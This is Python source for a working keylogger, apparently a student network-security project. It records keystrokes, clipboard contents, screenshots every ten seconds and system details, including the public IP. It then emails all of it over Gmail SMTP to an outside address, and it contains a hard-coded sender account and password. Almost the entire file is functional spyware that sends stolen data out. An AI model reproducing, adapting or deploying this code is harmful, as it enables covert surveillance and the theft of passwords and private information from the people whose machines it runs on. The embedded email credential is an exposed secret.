import os
import socket
import platform
import smtplib
import getpass
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener
from PIL import ImageGrab
from requests import get
import win32clipboard

class Keylogger:
    def __init__(self):
        self.file_path = "e:\\Collage\\BTECH-SEMESTER-6\\Network Security\\Project\\Key Logger"
        self.extend = "\\"

        self.keys_information = "key_log.txt"
        self.system_information = "system_information.txt"
        self.clipboard_information = "clipboard.txt"
        self.screenshot_information = "screenshot.png"

        self.email_address = "sameerthadimarri993@gmail.com"
        self.password = "ihjykuywkzlhyqiv"
        self.to_address = "sidedara88@gmail.com"
        self.username = getpass.getuser()

    def send_email(self, subject, body, attachment_path, to_addr):
        from_addr = self.email_address
        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        with open(attachment_path, 'rb') as attachment_file:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(attachment_file.read())
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
            msg.attach(attachment)

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(from_addr, self.password)
            server.sendmail(from_addr, to_addr, msg.as_string())

    def copy_clipboard(self):
        clipboard_path = os.path.join(self.file_path, self.clipboard_information)
        with open(clipboard_path, "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("Clipboard Data: \n" + pasted_data)
            except Exception as e:
                f.write(f"Clipboard could not be copied: {str(e)}")

    def screenshot(self):
        screenshot_path = os.path.join(self.file_path, self.screenshot_information)
        ImageGrab.grab().save(screenshot_path)

    def computer_information(self):
        system_info_path = os.path.join(self.file_path, self.system_information)
        with open(system_info_path, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip + "\n")
            except Exception as e:
                f.write(f"Couldn't get Public IP Address: {str(e)}\n")
            f.write("Processor: " + platform.processor() + '\n')
            f.write("System: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("Private IP Address: " + IPAddr + "\n")

    def on_press(self, key):
        with open(os.path.join(self.file_path, self.keys_information), "a") as f:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

    def keylog_and_screenshot(self):
        keys = []
        current_time = time.time()
        screenshot_time = current_time + 10
        keylog_email_time = current_time + 60

        with Listener(on_press=self.on_press) as listener:
            while True:
                time.sleep(0.1)
                current_time = time.time()

                if current_time > screenshot_time:
                    self.screenshot()
                    self.send_email("Screenshot", "Screenshot taken",
                                    os.path.join(self.file_path, self.screenshot_information), self.to_address)
                    screenshot_time = current_time + 10

                if current_time > keylog_email_time:
                    self.send_email("Key Log", "Key log information",
                                    os.path.join(self.file_path, self.keys_information), self.to_address)
                    keylog_email_time = current_time + 60

if __name__ == "__main__":
    keylogger = Keylogger()

    keylogger.computer_information()
    keylogger.send_email("System Information", "System information",
    os.path.join(keylogger.file_path, keylogger.system_information), keylogger.to_address)

    keylogger.copy_clipboard()
    keylogger.send_email("Clipboard Information", "Clipboard information",
    os.path.join(keylogger.file_path, keylogger.clipboard_information), keylogger.to_address)

    keylogger.keylog_and_screenshot()
